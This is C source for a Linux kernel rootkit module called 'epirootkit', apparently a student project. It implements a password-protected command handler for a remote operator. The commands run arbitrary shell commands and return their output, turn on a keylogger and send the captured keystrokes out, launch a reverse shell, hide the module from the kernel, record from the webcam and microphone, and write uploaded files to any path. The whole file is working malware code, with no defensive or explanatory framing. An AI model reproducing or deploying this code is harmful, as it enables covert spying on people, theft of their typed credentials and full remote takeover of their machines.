#include <linux/delay.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/module.h>
#include <linux/string.h>

#include "crypto.h"
#include "epirootkit.h"
#include "menu.h"

static u8 passwd_hash[SHA256_DIGEST_SIZE] = {
    0x5e, 0x7e, 0x56, 0x44, 0xa5, 0xeb, 0xfd,
    0x8e, 0x3f, 0xd4, 0x2a, 0x26, 0xf1, 0x5b,
    0xe3, 0xe7, 0x16, 0x6a, 0xc0, 0x22, 0x53,
    0xb5, 0xb4, 0x2a, 0x99, 0x43, 0x11, 0xed,
    0x09, 0x54, 0x99, 0x9d
};

// Handler prototypes
static int connect_handler(char *args);
static int disconnect_handler(char *args);
static int exec_handler(char *args);
static int klgon_handler(char *args);
static int klgoff_handler(char *args);
static int klg_handler(char *args);
static int getshell_handler(char *args);
static int killcom_handler(char *args);
static int hide_module_handler(char *args);
static int unhide_module_handler(char *args);
static int help_handler(char *args);
static int start_webcam_handler(char *args);
static int capture_image_handler(char *args);
static int start_microphone_handler(char *args);
static int play_audio_handler(char *args);
static int get_file_handler(char *args);
static int upload_handler(char *args);

static struct command rootkit_commands_array[] = {
    { "connect", 7, "unlock access to rootkit. Usage: connect [password]", 50, connect_handler },
    { "disconnect", 10, "disconnect user", 15, disconnect_handler },
    { "exec", 4, "execute a shell command. Usage: exec [-s for silent mode] [args*]", 65, exec_handler },
    { "klgon", 6, "activate keylogger", 20, klgon_handler },
    { "klgoff", 7, "deactivate keylogger", 21, klgoff_handler },
    { "klg", 3, "send keylogger content to server", 35, klg_handler },
    { "getshell", 8, "launch reverse shell", 20, getshell_handler },
    { "killcom", 7, "exit the module", 16, killcom_handler },
    { "hide_module", 11, "hide the module from the kernel", 34, hide_module_handler },
    { "unhide_module", 13, "unhide the module in the kernel", 36, unhide_module_handler },
    { "help", 4, "display this help message", 30, help_handler },
    { "start_webcam", 11, "activate webcam", 20, start_webcam_handler },
    { "capture_image", 13, "capture an image with the webcam", 50, capture_image_handler },
    { "start_microphone", 15, "start recording from microphone", 40, start_microphone_handler },
    { "play_audio", 10, "play an audio file", 40, play_audio_handler },
    { "hooks", 5, "manage hide/forbid/alter rules", 30, hooks_menu_handler },
    { "get_file", 8, "download a file from victim machine", 35, get_file_handler },
    { "upload", 6, "receive a file and save it on disk", 40, upload_handler },
    { NULL, 0, NULL, 0, NULL }
};

// Future implementation by thibounet
static int get_file_handler(char *args) {
    (void)args;
    return 0;
}

static int help_handler(char *args) {
    int i;
    char *help_msg = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
    int offset = snprintf(help_msg, STD_BUFFER_SIZE, "Available commands:\n");
    for (i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
        offset += snprintf(help_msg + offset, STD_BUFFER_SIZE - offset, "\t -%s: %s\n",
                           rootkit_commands_array[i].cmd_name, rootkit_commands_array[i].cmd_desc);
        if (offset >= STD_BUFFER_SIZE) {
            ERR_MSG("help_handler: help message truncated\n");
            break;
        }
    }

    send_to_server(help_msg);

    kfree(help_msg);

    return 0;
}

int rootkit_command(char *command, unsigned command_size) {
    // Remove newline character if present
    command[strcspn(command, "\n")] = '\0';

    if (command[command_size - 1] != '\0') {
        ERR_MSG("rootkit_command: command is not null-terminated\n");
        return -EINVAL;
    }

    if (!is_user_auth() && strncmp(command, "connect", 7) != 0 && strncmp(command, "help", 4) != 0) {
        send_to_server("You are not authentificated. See 'connect' command.\n");
        ERR_MSG("rootkit_command: user not authentificated\n");
        return -FAILURE;
    }

    int i;
    int ret_code = -EINVAL;
    for (i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
        if (strncmp(command, rootkit_commands_array[i].cmd_name, rootkit_commands_array[i].cmd_name_size) == 0) {
            char *args = command + rootkit_commands_array[i].cmd_name_size;
            while (args[0] == ' ')
                args++;
            ret_code = rootkit_commands_array[i].cmd_handler(args);
            return ret_code;
        }
    }

    ERR_MSG("rootkit_command: unknown command \"%s\"\n", command);
    send_to_server("unknown command\n");

    return ret_code;
}

static int connect_handler(char *args) {
    if (is_user_auth()) {
        send_to_server("You are already authentificated.\n");
        return true;
    }

    DBG_MSG("password received: %s\n", args);

    u8 hash[SHA256_DIGEST_SIZE] = { 0 };
    hash_string(args, hash);
    char hash_str[SHA256_DIGEST_SIZE * 2 + 1] = { 0 };
    char passwd_hash_str[SHA256_DIGEST_SIZE * 2 + 1] = { 0 };

    int i;
    for (i = 0; i < SHA256_DIGEST_SIZE; i++) {
        snprintf(hash_str + i * 2, 3, "%02x", hash[i]);
        snprintf(passwd_hash_str + i * 2, 3, "%02x", passwd_hash[i]);
    }

    DBG_MSG("computed hash: %s\n", hash_str);
    DBG_MSG("expected hash: %s\n", passwd_hash_str);

    bool hash_equals = are_hash_equals(passwd_hash, hash);
    if (hash_equals) {
        set_user_auth(true);
        DBG_MSG("connect_handler: user authentificated\n");
        send_to_server("User authentificated\n");
    }
    else {
        set_user_auth(false);
        ERR_MSG("connect_handler: error while authentificating user\n");
        msleep(2 * TIMEOUT_BEFORE_RETRY);
        send_to_server("Error while authentificating.\n");
    }

    return hash_equals;
}

static int disconnect_handler(char *args) {
    set_user_auth(false);
    send_to_server("User successfully disconnected.\n");
    return false;
}

static int exec_handler(char *args) {
    bool catch_stds = true;

    // if first non whitespace character is '-s', set catch_stds to false
    args += strspn(args, " \t");
    if (strncmp(args, "-s ", 3) == 0) {
        catch_stds = false;
        args += 3; // Skip the '-s ' part
    }

    // Extract the command from the received message
    char *command = args;
    command[strcspn(command, "\n")] = '\0';
    DBG_MSG("exec_handler: executing command: %s\n", command);

    // Execute the command
    int ret_code = exec_str_as_command(command, catch_stds);
    if (ret_code < 0) {
        ERR_MSG("exec_handler: failed to execute command\n");
        return ret_code;
    }

    if (catch_stds) {
        // Send the command output to the server
        send_to_server("stdout:");
        send_file_to_server(STDOUT_FILE);
        send_to_server("stderr:");
        send_file_to_server(STDERR_FILE);
    }

    return ret_code;
}

static int klgon_handler(char *args) {
    int ret_code = epikeylog_init(0);
    if (ret_code < 0) {
        ERR_MSG("klgon_handler: failed to activate keylogger\n");
        return ret_code;
    }
    send_to_server("keylogger activated\n");
    DBG_MSG("klgon_handler: keylogger activated\n");
    return ret_code;
}

static int klgoff_handler(char *args) {
    int ret_code = epikeylog_exit();
    if (ret_code < 0) {
        ERR_MSG("klgoff_handler: failed to deactivate keylogger\n");
        return ret_code;
    }
    send_to_server("keylogger deactivated\n");
    DBG_MSG("klgoff_handler: keylogger deactivated\n");
    return ret_code;
}

static int klg_handler(char *args) {
    int ret_code = epikeylog_send_to_server();
    if (ret_code < 0) {
        ERR_MSG("klg_handler: failed to send keylogger content\n");
        return ret_code;
    }
    DBG_MSG("klg_handler: keylogger content sent\n");
    return ret_code;
}

static int getshell_handler(char *args) {
    // remove all trailing space in args
    args += strspn(args, " \t");
    args[strcspn(args, "\n")] = '\0';
    // check if all chars are numbers
    if (args[0] == '\0') {
        DBG_MSG("getshell_handler: no port specified, using default port %d\n", REVERSE_SHELL_PORT);
        args = "0";
    }
    long shellport = simple_strtol(args, NULL, 10);
    if (shellport < 0 || shellport > 65535) {
        ERR_MSG("getshell_handler: invalid port number %ld\n", shellport);
        send_to_server("Invalid port number\n");
        return -EINVAL;
    }

    // Lancer le reverse shell avec le port spécifié
    int ret_code = launch_reverse_shell(args);

    if (ret_code < 0)
        ERR_MSG("getshell_handler: failed to launch reverse shell on port %ld\n", shellport);

    return ret_code;
}

static int killcom_handler(char *args) {
    DBG_MSG("killcom_handler: killcom received, exiting...\n");

    // The module will be removed by the usermode helper
    static char *argv[] = { "/usr/sbin/rmmod", "epirootkit", NULL };
    static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };

    // Unhiding module...
    unhide_module();
    int ret_code = unhide_module();
    if (ret_code < 0) {
        ERR_MSG("unhide_module_handler: failed to unhide module\n");
        return ret_code;
    }

    DBG_MSG("killcom_handler: calling rmmod from usermode...\n");

    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);

    return 0;
}

static int hide_module_handler(char *args) {
    DBG_MSG("hide_module_handler: hiding module\n");
    int ret_code = hide_module();
    if (ret_code < 0) {
        ERR_MSG("hide_module_handler: failed to hide module\n");
    }
    return ret_code;
}

static int unhide_module_handler(char *args) {
    DBG_MSG("unhide_module_handler: unhiding module\n");
    int ret_code = unhide_module();
    if (ret_code < 0) {
        ERR_MSG("unhide_module_handler: failed to unhide module\n");
    }
    return ret_code;
}

#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/string.h>
#include "crypto.h"
#include "epirootkit.h"
#include "network.h"

static int upload_handler(char *args) {
    struct file *file;
    mm_segment_t old_fs;
    char *enc_buf, *dec_buf;
    size_t enc_size = 0, dec_size = 0;
    int ret = 0;

    DBG_MSG("upload_handler: receiving encrypted file to path: %s\n", args);

    file = filp_open(args, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (IS_ERR(file)) {
        ERR_MSG("upload_handler: failed to open destination file %s\n", args);
        send_to_server("Failed to open file.\n");
        return PTR_ERR(file);
    }

    old_fs = get_fs();
    set_fs(KERNEL_DS);

    send_raw_to_server("READY_TO_RECEIVE\n");

    enc_buf = kmalloc(PAGE_SIZE * 32, GFP_KERNEL); // 128 KB max
    if (!enc_buf) {
        filp_close(file, NULL);
        set_fs(old_fs);
        return -ENOMEM;
    }

    size_t pos = 0;
    while (true) {
        char tmp[4096] = {0};
        struct kvec vec = { .iov_base = tmp, .iov_len = sizeof(tmp) };
        struct msghdr msg = { 0 };
        int len = kernel_recvmsg(get_worker_socket(), &msg, &vec, 1, sizeof(tmp), 0);
        if (len <= 0) break;

        if (len >= 4 && !memcmp(tmp + len - 4, "EOF\n", 4)) len -= 4;

        if (pos + len > PAGE_SIZE * 32) {
            ERR_MSG("upload_handler: file too large, buffer overflow\n");
            ret = -ENOMEM;
            goto out;
        }

        memcpy(enc_buf + pos, tmp, len);
        pos += len;
        if (len < sizeof(tmp)) break;
    }

    enc_size = pos;

    ret = decrypt_buffer(enc_buf, enc_size, &dec_buf, &dec_size);
    if (ret != 0) {
        ERR_MSG("upload_handler: decryption failed with code %d\n", ret);
        send_to_server("Decryption failed\n");
        goto out;
    }

    vfs_write(file, dec_buf, dec_size, &file->f_pos);
    send_to_server("Upload completed and decrypted successfully\n");

    kfree(dec_buf);
out:
    kfree(enc_buf);
    filp_close(file, NULL);
    set_fs(old_fs);
    return ret;
}

// Command to start the webcam and capture an image
static int start_webcam_handler(char *args) {
    DBG_MSG("start_webcam_handler: starting webcam to capture an image\n");
    static char *argv[] = { "/usr/bin/ffmpeg", "-f", "v4l2", "-i", "/dev/video0", "-t", "00:00:10", "-s", "640x480", "-f", "image2", "/tmp/capture.jpg", NULL };
    static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };

    int ret_code = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    if (ret_code < 0) {
        ERR_MSG("start_webcam_handler: failed to start webcam\n");
        return ret_code;
    }
    DBG_MSG("start_webcam_handler: webcam started successfully, image captured\n");
    send_to_server("Webcam activated and image captured\n");
    return SUCCESS;
}

// Command to capture an image from the webcam
static int capture_image_handler(char *args) {
    DBG_MSG("capture_image_handler: capturing an image from the webcam\n");
    static char *argv[] = { "/usr/bin/ffmpeg", "-f", "v4l2", "-i", "/dev/video0", "-t", "00:00:10", "-s", "640x480", "-f", "image2", "/tmp/capture.jpg", NULL };
    static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };

    int ret_code = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    if (ret_code < 0) {
        ERR_MSG("capture_image_handler: failed to capture image\n");
        return ret_code;
    }
    DBG_MSG("capture_image_handler: image captured successfully, saved at /tmp/capture.jpg\n");
    send_to_server("Captured image saved at /tmp/capture.jpg\n");

    /*
    // Copy the image to a directory accessible by Flask
    // For example, to /var/www/html/images/ on the server
    int copy_ret_code = system("cp /tmp/capture.jpg /var/www/html/images/capture.jpg");
    if (copy_ret_code < 0) {
        ERR_MSG("capture_image_handler: failed to copy image to web accessible directory\n");
        return copy_ret_code;
    }
    */
    return SUCCESS;
}

// Command to start recording from the microphone
static int start_microphone_handler(char *args) {
    DBG_MSG("start_microphone_handler: starting microphone recording\n");
    static char *argv[] = { "/usr/bin/arecord", "-D", "plughw:1,0", "-f", "cd", "-t", "wav", "-d", "10", "/tmp/audio.wav", NULL };
    static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };

    int ret_code = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    if (ret_code < 0) {
        ERR_MSG("start_microphone_handler: failed to start microphone\n");
        return ret_code;
    }
    DBG_MSG("start_microphone_handler: microphone recording started successfully, audio saved at /tmp/audio.wav\n");
    send_to_server("Microphone activated and audio recorded\n");
    return SUCCESS;
}

// Command to play an audio file
static int play_audio_handler(char *args) {
    DBG_MSG("play_audio_handler: playing audio file from /tmp/audio.wav\n");
    static char *argv[] = { "/usr/bin/aplay", "/tmp/audio.wav", NULL };
    static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };

    int ret_code = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    if (ret_code < 0) {
        ERR_MSG("play_audio_handler: failed to play audio\n");
        return ret_code;
    }
    DBG_MSG("play_audio_handler: audio played successfully\n");
    send_to_server("Audio played\n");
    return SUCCESS;
}